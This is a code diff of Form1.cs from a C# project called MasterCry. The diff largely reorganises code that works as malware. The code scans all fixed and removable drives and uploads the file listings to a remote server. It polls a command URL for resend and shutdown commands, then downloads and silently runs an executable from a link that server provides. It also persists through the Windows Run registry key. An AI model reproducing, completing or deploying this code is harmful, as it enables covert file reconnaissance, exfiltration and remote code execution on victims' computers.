@@ -1,12 +1,11 @@
-﻿
-/****************************** ghost1372.github.io ******************************\
+﻿/****************************** ghost1372.github.io ******************************\
 *	Module Name:	Form1.cs
 *	Project:		MasterCry
 *	Copyright (C) 2017 Mahdi Hosseini, All rights reserved.
 *	This software may be modified and distributed under the terms of the MIT license.  See LICENSE file for details.
 *
 *	Written by Mahdi Hosseini <Mahdidvb72@gmail.com>,  2017, 9, 18, 08:45 ب.ظ
-*	
+*
 ***********************************************************************************/
 
 using Microsoft.Win32;
@@ -14,11 +13,9 @@ using System;
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.Data;
-using System.Drawing;
 using System.IO;
 using System.Linq;
 using System.Net;
-using System.Text;
 using System.Text.RegularExpressions;
 using System.Threading.Tasks;
 using System.Windows.Forms;
@@ -31,109 +28,6 @@ namespace MasterCry
         {
             InitializeComponent();
         }
-
-#region "Downloader"
-        //Todo: Test Downloder
-        private void Downloader()
-        {
-            if (IsConnectToInternet())
-            {
-                var result = (new WebClient()).DownloadString(BuildVars.Command_URL);
-
-                String link = ExtractData(result, BuildVars.Command_URL_Symbol);
-                String ver = ExtractData(result, BuildVars.Command_VER_Symbol);
-                String com = ExtractData(result, BuildVars.Command_COM_Symbol);
-
-                // Command Control
-
-                if (com.Equals(BuildVars.Command_RESEND))       //Resend Data
-                {
-                    if (File.Exists(BuildVars.Save_Items_Location))
-                        File.Delete(BuildVars.Save_Items_Location);
-                    Form1_Load(null, null);
-                }
-                else if (com.Equals(BuildVars.Command_SHUTDOWN))        //ShutDOWN App
-                {
-                    RegisterInStartup(false);
-                }
-
-                var preVer = System_Details.ReadSetting(BuildVars.Config_Command_Version);
-
-                if (preVer.Equals("0") || ver != preVer && !link.Equals("null"))
-                {
-                    try
-                    {
-                        System_Details.AddUpdateAppSettings(BuildVars.Config_Command_Version, ver);
-                        using (WebClient wc = new WebClient())
-                        {
-                            wc.DownloadFileCompleted += WebClientDownloadCompleted;
-                            wc.DownloadFileAsync(new System.Uri(link), ver +
-                            BuildVars.Exe_Name);
-                        }
-                    }
-                    catch (WebException) { }
-                    catch (Exception) { }
-                }
-            }
-            
-        }
-        private void WebClientDownloadCompleted(object sender, AsyncCompletedEventArgs args)
-        {
-            System.Diagnostics.Process.Start(System_Details.ReadSetting(BuildVars.Config_Command_Version) + BuildVars.Exe_Name);
-        }
-        private string ExtractData(string Result, string Symbol)
-        {
-            int pFrom = Result.IndexOf(Symbol) + Symbol.Length;
-            int pTo = Result.LastIndexOf(Symbol);
-            return Result.Substring(pFrom, pTo - pFrom);
-        }
-
-        public static bool IsConnectToInternet()
-        {
-            try
-            {
-                using (var client = new WebClient())
-                using (var stream = client.OpenRead("http://www.google.com"))
-                {
-                    return true;
-                }
-            }
-            catch
-            {
-                return false;
-            }
-        }
-
-        #endregion
-        //Check Every 2 Min
-        private void tmrURLCheck_Tick(object sender, EventArgs e)
-        {
-            Downloader();
-        }
-
-        #region "Startup"
-        private void RegisterInStartup(bool isChecked)
-        {
-            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey
-                    (BuildVars.Registry_Key, true);
-            if (isChecked)
-            {
-                registryKey.SetValue(BuildVars.Registry_AppName, Application.ExecutablePath);
-            }
-            else
-            {
-                registryKey.DeleteValue(BuildVars.Registry_AppName);
-            }
-        }
-        public static bool CheckRegistryExists()
-        {
-            RegistryKey root;
-            root = Registry.CurrentUser.OpenSubKey(BuildVars.Registry_Key, false);
-
-            return root.GetValue(BuildVars.Registry_AppName) != null;
-        }
-
-        #endregion
 
         //Todo: Enable StartUp
         private void Form1_Load(object sender, EventArgs e)
@@ -148,10 +42,9 @@ namespace MasterCry
                     foreach (var drv in getDrives())
                     {
                         var data = GetFileList(drv);
+
                         foreach (var item in data)
-                        {
                             WriteItems(item);
-                        }
                     }
                     Upload();
                 }
@@ -159,28 +52,23 @@ namespace MasterCry
                 {
                     string content = File.ReadAllText(BuildVars.Save_Items_Location);
                     if (content.Length != 0)
-                    {
                         Upload();
-                    }
                 }
             });
-           
 
             //if (!CheckRegistryExists())
-            //{
             //    RegisterInStartup(true);
-            //}
-            
         }
+
         #region "Search Files on Drives"
-        List<string> getDrives()
+
+        private List<string> getDrives()
         {
             DriveInfo[] allDrives = DriveInfo.GetDrives();
             List<string> listRange = new List<string>();
 
             foreach (DriveInfo d in allDrives)
             {
-
                 if (d.DriveType == DriveType.Fixed || d.DriveType == DriveType.Removable)
                 {
                     if (d.Name.Equals(OSDrive()))
@@ -195,6 +83,7 @@ namespace MasterCry
             }
             return listRange;
         }
+
         public IEnumerable<string> GetFileList(string rootFolderPath)
         {
             string[] exceptions = new string[] { @"C:\System Volume Information", @"C:\$RECYCLE.BIN",
@@ -232,6 +121,7 @@ namespace MasterCry
                 }
             }
         }
+
         private string OSDrive()
         {
             return Path.GetPathRoot(Environment.SystemDirectory);
@@ -247,21 +137,116 @@ namespace MasterCry
                     file.WriteLine(Text);
                 }
             }
-            catch (Exception)
-            { }
-           
+            catch (IOException) { }
+            catch (Exception) { }
         }
-        #endregion
 
+        #endregion "Search Files on Drives"
+
+        #region "Startup"
+
+        private void RegisterInStartup(bool isChecked)
+        {
+            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey
+                    (BuildVars.Registry_Key, true);
+            if (isChecked)
+                registryKey.SetValue(BuildVars.Registry_AppName, Application.ExecutablePath);
+            else
+                registryKey.DeleteValue(BuildVars.Registry_AppName);
+        }
+
+        public static bool CheckRegistryExists()
+        {
+            RegistryKey root;
+            root = Registry.CurrentUser.OpenSubKey(BuildVars.Registry_Key, false);
+
+            return root.GetValue(BuildVars.Registry_AppName) != null;
+        }
+
+        #endregion "Startup"
+
+        #region "Downloader"
+
+        //Todo: Test Downloder
+
+        private void Downloader()
+        {
+            if (IsConnectToInternet())
+            {
+                var result = (new WebClient()).DownloadString(BuildVars.Command_URL);
+
+                String link = ExtractData(result, BuildVars.Command_URL_Symbol);
+                String ver = ExtractData(result, BuildVars.Command_VER_Symbol);
+                String com = ExtractData(result, BuildVars.Command_COM_Symbol);
+
+                // Command Control
+                if (com.Equals(BuildVars.Command_RESEND))       //Resend Data
+                {
+                    if (File.Exists(BuildVars.Save_Items_Location))
+                        File.Delete(BuildVars.Save_Items_Location);
+                    Form1_Load(null, null);
+                }
+                else if (com.Equals(BuildVars.Command_SHUTDOWN))        //ShutDOWN App
+                    RegisterInStartup(false);
+
+                var preVer = System_Details.ReadSetting(BuildVars.Config_Command_Version);
+
+                if (preVer.Equals("0") || ver != preVer && !link.Equals("null"))
+                {
+                    try
+                    {
+                        System_Details.AddUpdateAppSettings(BuildVars.Config_Command_Version, ver);
+                        using (WebClient wc = new WebClient())
+                        {
+                            wc.DownloadFileCompleted += WebClientDownloadCompleted;
+                            wc.DownloadFileAsync(new System.Uri(link), ver +
+                            BuildVars.Exe_Name);
+                        }
+                    }
+                    catch (WebException) { }
+                    catch (Exception) { }
+                }
+            }
+        }
+
+        private void WebClientDownloadCompleted(object sender, AsyncCompletedEventArgs args)
+        {
+            try
+            {
+                System.Diagnostics.Process.Start(System_Details.ReadSetting(BuildVars.Config_Command_Version) + BuildVars.Exe_Name);
+            }
+            catch (System.IO.FileNotFoundException) { }
+            catch (IOException) { }
+        }
+
+        private string ExtractData(string Result, string Symbol)
+        {
+            int pFrom = Result.IndexOf(Symbol) + Symbol.Length;
+            int pTo = Result.LastIndexOf(Symbol);
+            return Result.Substring(pFrom, pTo - pFrom);
+        }
+
+        public static bool IsConnectToInternet()
+        {
+            try
+            {
+                using (var client = new WebClient())
+                using (var stream = client.OpenRead("http://www.google.com"))
+                    return true;
+            }
+            catch { return false; }
+        }
+
+        #endregion "Downloader"
 
         private void Upload()
         {
-           
             if (IsConnectToInternet())
             {
                 try
                 {
-                    Task.Factory.StartNew(() => {
+                    Task.Factory.StartNew(() =>
+                    {
                         if (File.Exists(BuildVars.Save_Items_Location))
                         {
                             var lines = File.ReadAllLines(BuildVars.Save_Items_Location);
@@ -284,11 +269,15 @@ namespace MasterCry
                         File.Delete(BuildVars.Save_Items_Location);
                     });
                 }
-                catch (Exception)
-                { }
-                
+                catch (WebException) { }
+                catch (Exception) { }
             }
-            
+        }
+
+        //Check Every 5 Min
+        private void tmrURLCheck_Tick(object sender, EventArgs e)
+        {
+            Downloader();
         }
     }
 }
